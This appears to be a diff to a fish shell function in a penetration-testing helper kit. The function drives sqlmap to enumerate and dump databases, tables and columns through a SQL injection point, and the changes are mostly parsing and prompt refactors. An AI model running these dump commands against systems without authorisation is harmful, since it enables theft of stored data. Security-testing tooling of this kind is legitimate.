@@ -30,14 +30,8 @@ Example: ezpz enumsqli -u 'http://test.com/vuln.php?id=1' --cookie='...'
         return 1
     end
 
-    # Create temporary directory
-    set tmp_dir (mktemp -d)
-    function cleanup --on-event fish_exit
-        rm -rf $tmp_dir
-    end
-
     # Start DBMS enumeration
-    ezpz_header "Starting DBMS enumeration..."
+    ezpz_title "Starting DBMS enumeration..."
 
     # Banner
     ezpz_header "Fetching database banner"
@@ -55,20 +49,22 @@ Example: ezpz enumsqli -u 'http://test.com/vuln.php?id=1' --cookie='...'
     sqlmap $argv --privileges --batch 2>/dev/null | grep -oP --color=never "(?<=privilege: ').*(?=')" | grep -v '^$'
 
     # Start data enumeration
-    ezpz_header "Starting data enumeration..."
+    ezpz_title "Starting data enumeration..."
     ezpz_header "Fetching all databases"
     ezpz_cmd "sqlmap $argv --dbs --batch"
     sqlmap $argv --dbs --batch 2>/dev/null | \
-        grep -vE "^\s*$|starting|ending|\[INFO\]|\[WARNING\]|\[CRITICAL\]" | \
-        sed 's/^\[\*\] //' | grep -E '^[a-zA-Z0-9_]+$' | tee "$tmp_dir/dbs.txt"
+        tail -n +10 | \
+        grep -vE '^[[:space:]]*$|starting|ending|\[INFO\]|\[WARNING\]|\[CRITICAL\]' | \
+        sed 's/^\[\*\] //' | grep --color=never -E '^[a-zA-Z0-9_]+$'
 
     # Get current database
     set current_db (sqlmap $argv --current-db --batch 2>/dev/null | grep -oP --color=never "(?<=current database: ').*(?=')")
     
     # Ask user which database to enumerate
     ezpz_question "Select database (all/current/name) [current]: "
-    read -P "" -t 300 db_choice
+    read -l db_choice
     or set db_choice "current" # Default to current if timeout
+    set db_choice (string trim $db_choice)
 
     switch $db_choice
         case "" "current"
@@ -90,51 +86,57 @@ Example: ezpz enumsqli -u 'http://test.com/vuln.php?id=1' --cookie='...'
     ezpz_header "Fetching tables for database '$db'"
     ezpz_cmd "sqlmap $argv -D \"$db\" --tables --batch"
     sqlmap $argv -D "$db" --tables --batch 2>/dev/null | \
+        #tail -n +10 | \
         grep -oP --color=never "(?<=\| ).*(?= \|)" | tail -n +2 | \
-        sed 's/[[:space:]]*$//' | tee "$tmp_dir/tables.txt"
+        sed 's/[[:space:]]*$//'
 
-    if not test -s "$tmp_dir/tables.txt"
+    if not test $status -eq 0
         ezpz_error "No tables found in database '$db'."
         return 1
     end
 
     # Ask user which tables to enumerate
     ezpz_question "Select tables (all/names): [all] "
-    read -P "" -t 300 table_choice
+    read -l table_choice
     or set table_choice "all" # Default to all if timeout
+    set table_choice (string trim $table_choice)
 
     switch $table_choice
         case "" "all"
             ezpz_header "Dumping all tables"
             ezpz_cmd "sqlmap $argv -D \"$db\" --dump --batch"
             sqlmap $argv -D "$db" --dump --batch | \
-                grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | grep -vE '^\+\-+'
+                tail -n +10 | \
+                grep --color=never -oP "Database: .*|Table: .*|^\++|\|\s.*" | grep -vE '^\++'
             return 0
         case '*'
             for table in (string split "," $table_choice)
                 set table (string trim $table)
-                
-                ezpz_title "Accessing table \"$table\""
+                ezpz_title "Accessing table \"$table\"..."
                 ezpz_header "Retrieving columns for table '$table'"
                 ezpz_cmd "sqlmap $argv -D \"$db\" -T \"$table\" --columns --batch"
                 sqlmap $argv -D "$db" -T "$table" --columns --batch 2>/dev/null | \
-                    grep -oP '(?<=\| )[a-zA-Z0-9_]+' | tee "$tmp_dir/columns.txt"
+                    tail -n +10 | \
+                    grep --color=never -oP "^\++|\|\s.*" | grep -vE '^\++'
 
                 ezpz_question "Select columns (all/names): [all] "
-                read -P "" -t 300 column_choice
+                read -l column_choice
                 or set column_choice "all" # Default to all if timeout
+                set column_choice (string trim $column_choice)
 
                 switch $column_choice
                     case "" "all"
                         ezpz_header "Dumping all columns from table '$table'"
                         ezpz_cmd "sqlmap $argv -D \"$db\" -T \"$table\" --dump --batch"
                         sqlmap $argv -D "$db" -T "$table" --dump --batch | \
-                            grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | grep -vE '^\+\-+'
+                            tail -n +10 | \
+                            grep --color=never -oP "Database: .*|Table: .*|^\++|\|\s.*" | grep -vE '^\++'
                     case '*'
                         ezpz_header "Dumping selected columns from table '$table'"
                         ezpz_cmd "sqlmap $argv -D \"$db\" -T \"$table\" -C \"$column_choice\" --dump --batch"
-                        sqlmap $argv -D "$db" -T \"$table\" -C \"$column_choice\" --dump --batch | \
-                            grep --color=never -P "Database: .*|Table: .*|^\+\-*|\|\s.*" | grep -vE '^\+\-+'
+                        sqlmap $argv -D "$db" -T "$table" -C "$column_choice" --dump --batch | \
+                            tail -n +10 | \
+                            grep --color=never -oP "Database: .*|Table: .*|^\++|\|\s.*" | grep -vE '^\++'
                 end
             end
     end
